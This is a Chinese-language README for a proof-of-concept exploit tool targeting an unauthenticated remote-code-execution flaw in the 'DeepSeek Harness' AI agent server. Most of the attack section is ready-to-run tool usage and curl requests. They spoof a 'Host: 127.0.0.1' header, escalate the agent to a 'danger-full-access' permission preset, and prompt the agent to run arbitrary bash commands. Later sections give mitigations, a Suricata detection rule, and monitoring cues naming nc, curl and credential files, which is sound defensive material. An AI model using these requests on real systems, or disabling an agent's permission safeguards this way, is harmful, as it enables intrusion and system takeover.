# QVD-2026-57410 PoC

> DeepSeek Harness HTTP Host Header Bypass → Unauthenticated Remote Code Execution  
> **CVSS 9.8 (Critical)**

完整的、经过验证的 PoC 实现，基于 [GitHub Discussion #853](https://github.com/deepseek-ai/deepseek-harness/discussions/853) 官方验证的攻击流程。

## ⚠️ 重要声明

**本工具仅供授权安全测试、漏洞研究和防御性验证使用。**

未经授权访问计算机系统是违法行为。使用者需确保已获得明确授权。作者对滥用本工具导致的任何法律责任概不负责。

---

## 漏洞概述

| 项目 | 内容 |
|---|---|
| 漏洞编号 | QVD-2026-57410 |
| 严重程度 | CVSS 9.8 (Critical) |
| 影响版本 | DeepSeek Harness 0.1.1-rc.2 及早期版本 |
| 漏洞类型 | HTTP Host 头信任缺陷 → 未授权 RCE |
| 攻击复杂度 | Low（无需认证，仅需伪造 HTTP 头） |
| 所需权限 | None |
| 用户交互 | None |

### 根因

DeepSeek Harness 的 `/api` 接口通过检查 HTTP `Host` 头来判断请求是否来自本地，将高权限 RPC 方法限制在"回环地址"上。但 `Host` 头由客户端完全控制，攻击者可以任意伪造。

当服务暴露到非回环网络时（Docker 端口映射、Nginx 反代等），攻击者通过伪造 `Host: 127.0.0.1` 即可绕过检查，直接调用高权限方法，驱动 Agent 执行任意系统命令。

### 攻击链

```
1. 伪造 Host: 127.0.0.1 绕过本地检查
   ↓
2. 调用 /api/session.create 创建会话（任意工作目录）
   ↓
3. 调用 /api/commands/execute 提升权限到 danger-full-access
   ↓
4. 调用 /api/session.prompt 驱动 Agent 执行 bash 命令
   ↓
5. 获得与 DSH 进程同级的系统权限
```

---

## 工具使用

### 依赖安装

```bash
pip install requests
```

### 基础用法

**1. 检查目标是否存在漏洞**

```bash
python dsh_exploit_v2.py -t http://target:3000 --check
```

**输出示例**：
```
[*] Checking vulnerability...
[*] API Call: POST /api/session.create
[+] Target is VULNERABLE! Successfully created session: session-abc123...

============================================================
VULNERABILITY CONFIRMED
============================================================
Session ID: session-abc123...
Target accepts unauthenticated session creation with spoofed Host header.
============================================================
```

**2. 执行单条命令**

```bash
python dsh_exploit_v2.py -t http://target:3000 -c "id > /tmp/dsh-rce-poc.txt"
```

**3. 执行命令并自定义等待时间**

```bash
python dsh_exploit_v2.py -t http://target:3000 -c "whoami" --wait 30
```

**4. 详细模式（显示所有 HTTP 流量）**

```bash
python dsh_exploit_v2.py -t http://target:3000 -c "id" -v
```

### 完整参数列表

```
必需参数:
  -t, --target URL         目标 URL (如 http://victim:3000)

操作模式:
  --check                  仅检查是否存在漏洞
  -c, --command CMD        执行单条系统命令

可选参数:
  --cwd DIR                会话工作目录 (默认: /tmp)
  --wait SECONDS           等待异步执行的秒数 (默认: 60)
  --timeout SECONDS        HTTP 请求超时 (默认: 30)
  -v, --verbose            详细输出模式
```

---

## 手动验证（使用 curl）

基于 [GitHub Discussion #853](https://github.com/deepseek-ai/deepseek-harness/discussions/853) 官方 PoC：

### Step 1: 创建会话

```bash
curl -H "Host: 127.0.0.1" \
     -H "Content-Type: application/json" \
     http://target:3000/api/session.create \
     -d '{"cwd":"/tmp"}'
```

**预期响应**：
```json
{"sessionId":"session-abc123..."}
```

### Step 2: 提升权限

```bash
curl -H "Host: 127.0.0.1" \
     -H "Content-Type: application/json" \
     http://target:3000/api/commands/execute \
     -d '{"args":{"agentId":"session-abc123...","line":"/permission danger-full-access"}}'
```

**预期响应**：
```json
{"result":{"kind":"success","text":"preset danger-full-access"}}
```

### Step 3: 执行命令

```bash
curl -H "Host: 127.0.0.1" \
     -H "Content-Type: application/json" \
     http://target:3000/api/session.prompt \
     -d '{
       "sessionId":"session-abc123...",
       "mode":"steer",
       "content":[{
         "type":"text",
         "text":"Immediately use the bash tool to run exactly this command: id > /tmp/dsh-rce-poc.txt"
       }]
     }'
```

**预期响应**：
```json
{"accepted":true}
```

### Step 4: 验证执行结果

约 60 秒后，检查目标文件系统：

```bash
ssh target "cat /tmp/dsh-rce-poc.txt"
```

---

## 受影响部署场景

### 1. Docker 端口映射

```bash
# 危险配置
docker run -p 0.0.0.0:3000:3000 deepseek-harness
```

→ 服务监听所有接口，任何能访问宿主机 IP 的攻击者都可利用

### 2. Nginx 反向代理

```nginx
# 危险配置
location /api {
    proxy_pass http://127.0.0.1:3000;
    proxy_set_header Host $host;  # 直接透传客户端 Host 头
}
```

→ 攻击者的 `Host: 127.0.0.1` 被原样转发

### 3. 云负载均衡器

将 DSH 部署到云实例，通过 ALB/NLB 暴露 `/api` 路径，且未重写 Host 头

---

## 修复建议

### 临时缓解措施

**1. 严格绑定回环地址**

```bash
# 确保只监听 localhost
npx @deepseek-ai/dsh web --host 127.0.0.1 --port 3000

# Docker: 仅映射到 localhost
docker run -p 127.0.0.1:3000:3000 deepseek-harness
```

**2. 反向代理加固**

```nginx
location /api {
    # IP 白名单
    allow 10.0.0.0/8;
    allow 172.16.0.0/12;
    deny all;
    
    # 强制重写 Host 头
    proxy_set_header Host "127.0.0.1:3000";
    proxy_pass http://127.0.0.1:3000;
}
```

**3. 添加认证层**

```nginx
location /api {
    # HTTP Basic Auth
    auth_basic "Restricted";
    auth_basic_user_file /etc/nginx/.htpasswd;
    
    # 或使用 mTLS
    ssl_client_certificate /path/to/ca.crt;
    ssl_verify_client on;
    
    proxy_pass http://127.0.0.1:3000;
}
```

### 长期修复方案

1. **不信任客户端可控的 HTTP 头** - 检查 TCP 连接的 `remoteAddress`
2. **使用 Unix Socket** - 替代 TCP 监听
3. **实施 API Token 认证** - 强制所有请求携带随机 Bearer Token
4. **默认拒绝非回环访问** - 在 Socket 层验证而非 HTTP 层

---

## 检测方法

### 网络层检测（Suricata 规则）

```
alert http any any -> any any (
  msg:"DSH Host Header Spoofing Attempt";
  content:"POST"; http_method;
  content:"/api/"; http_uri;
  content:"Host: 127.0.0.1"; http_header;
  flow:to_server,established;
  classtype:web-application-attack;
  sid:10001; rev:1;
)
```

### 应用层日志特征

- 来自非 `127.0.0.1` 源 IP 的 `/api` 请求
- Host 头为 `127.0.0.1` / `localhost`，但真实 IP 不匹配
- RPC 方法：`session.create`、`commands/execute`、`session.prompt`

### 系统层监控

- DSH 进程产生异常子进程：`bash -c`、`nc`、`curl`
- 非预期的出站连接
- 敏感文件访问：`/etc/passwd`、`/proc/self/environ`

---

## 技术细节

### API 端点格式

DeepSeek Harness 使用**直接 REST API**，而非 JSON-RPC：

| 端点 | 方法 | 请求体 | 响应 |
|---|---|---|---|
| `/api/session.create` | POST | `{"cwd":"<dir>"}` | `{"sessionId":"..."}` |
| `/api/commands/execute` | POST | `{"args":{"agentId":"...","line":"..."}}` | `{"result":{...}}` |
| `/api/session.prompt` | POST | `{"sessionId":"...","mode":"steer","content":[...]}` | `{"accepted":true}` |

### 异步执行机制

DSH Agent 的命令执行是**异步**的：
- `session.prompt` 返回 `{"accepted":true}` 仅表示 prompt 被接受
- 实际命令执行需要 30-60 秒（取决于模型响应速度）
- 结果出现在目标文件系统或 DSH 会话日志中，不会回传给客户端

### Host 头伪造原理

```python
# 错误的安全检查（服务端）
def is_local_request(request):
    host = request.headers['host']  # 客户端可控
    return host in ['127.0.0.1', 'localhost', ...]

# 绕过（攻击者）
headers = {"Host": "127.0.0.1"}  # 伪造成本为零
```

正确的检查应该是：
```python
def is_local_request(request):
    remote_addr = request.socket.remote_address[0]  # TCP 层信息
    return remote_addr in ['127.0.0.1', '::1']
```

---

## 参考资料

- **官方验证的 PoC**: [GitHub Discussion #853](https://github.com/deepseek-ai/deepseek-harness/discussions/853)
- **DeepSeek Harness 仓库**: [github.com/deepseek-ai/deepseek-harness](https://github.com/deepseek-ai/deepseek-harness)
- **奇安信威胁情报中心预警**: [cn-sec.com/archives/5403588.html](https://cn-sec.com/archives/5403588.html)
- **OWASP Host Header Injection**: [owasp.org](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)

---

## License

MIT License

Copyright (c) 2026 HackSpeak

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. USE AT YOUR OWN RISK.
